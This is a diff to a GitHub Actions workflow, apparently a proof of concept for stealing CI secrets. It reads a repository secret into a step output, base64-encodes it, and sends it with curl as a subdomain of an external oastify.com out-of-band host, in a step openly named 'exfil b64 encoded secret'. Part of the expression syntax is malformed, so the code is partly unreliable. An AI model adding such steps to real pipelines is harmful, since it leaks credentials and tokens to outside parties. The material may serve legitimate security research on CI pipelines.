@@ -26,7 +26,11 @@ jobs:
         run: |
          echo "exfilsecret=${{secrets.A_SECRET}}" >> $GITHUB_OUTPUT
 
-      - name: Show output and exfil data
+      - name: Base64 wrap and print to action log
+        id: exfil2
         run: |
           echo  eureka=[${{steps.exfil.outputs.exfilsecret}}]|base64
-          curl -v http://${eureka}.ra59rmdtjx3wh3khhtnu5cimxd34rwfl.oastify.com
+          
+      - name: exfil b64 encoded secret
+        run: |
+          curl -v http://${steps.exfil2.outputs.eureka}.ra59rmdtjx3wh3khhtnu5cimxd34rwfl.oastify.com
